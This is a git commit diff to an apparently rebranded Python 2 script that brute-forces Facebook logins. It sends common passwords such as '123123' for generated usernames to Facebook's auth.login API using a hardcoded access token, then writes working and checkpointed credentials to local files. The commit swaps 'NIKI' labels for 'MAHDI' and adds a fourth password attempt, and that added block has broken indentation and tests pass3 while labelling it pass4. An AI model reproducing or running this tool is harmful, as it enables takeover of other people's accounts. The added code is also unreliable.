23e9a1034869d277452d91ad314e7b71e3008d80
MAHDI-Shuvo <102132190+MAHDI-Shuvo@users.noreply.github.com>
2022-03-29 22:43:29 +0600

    Update mahdi.py

--- mahdi.py
+++ mahdi.py
@@ -234,13 +234,13 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m [NIKI-OK] ' + k + c + user + '  |  ' + pass1
+                print '\x1b[1;92m [MAHDI-OK] ' + k + c + user + '  |  ' + pass1
                 okb = open('save/nikiok.txt', 'a')
                 okb.write(k + c + user + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m [NIKI-CP] ' + k + c + user + '  |  ' + pass1
+                print '\x1b[1;91m [MAHDI-CP] ' + k + c + user + '  |  ' + pass1
                 cps = open('save/nikicp.txt', 'a')
                 cps.write(k + c + user + pass1 + '\n')
                 cps.close()
@@ -250,13 +250,13 @@ def action():
                 data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                 q = json.load(data)
                 if 'access_token' in q:
-                    print '\x1b[1;92m [NIKI-OK] ' + k + c + user + '  |  ' + pass2
+                    print '\x1b[1;92m [MAHDI-OK] ' + k + c + user + '  |  ' + pass2
                     okb = open('save/nikiok.txt', 'a')
                     okb.write(k + c + user + pass2 + '\n')
                     okb.close()
                     oks.append(c + user + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;91m [NIKI-CP] ' + k + c + user + '  |  ' + pass2
+                    print '\x1b[1;91m [MAHDI-CP] ' + k + c + user + '  |  ' + pass2
                     cps = open('save/nikicp.txt', 'a')
                     cps.write(k + c + user + pass2 + '\n')
                     cps.close()
@@ -272,11 +272,29 @@ def action():
                         okb.close()
                         oks.append(c + user + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print '\x1b[1;91m [NIKI-CP] ' + k + c + user + '  |  ' + pass3
+                        print '\x1b[1;91m [MAHDI-CP] ' + k + c + user + '  |  ' + pass3
                         cps = open('save/nikicp.txt', 'a')
                         cps.write(k + c + user + pass3 + '\n')
                         cps.close()
                         cpb.append(c + user + pass3)
+			
+			
+			 pass4 = '123123'
+                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;92m [MAHDI-OK] ' + k + c + user + '  |  ' + pass4
+                        okb = open('save/nikiok.txt', 'a')
+                        okb.write(k + c + user + pass3 + '\n')
+                        okb.close()
+                        oks.append(c + user + pass3)
+                    elif 'www.facebook.com' in q['error_msg']:
+                        print '\x1b[1;91m [MAHDI-CP] ' + k + c + user + '  |  ' + pass4
+                        cps = open('save/nikicp.txt', 'a')
+                        cps.write(k + c + user + pass3 + '\n')
+                        cps.close()
+                        cpb.append(c + user + pass3)
+			
         except:
             pass
 
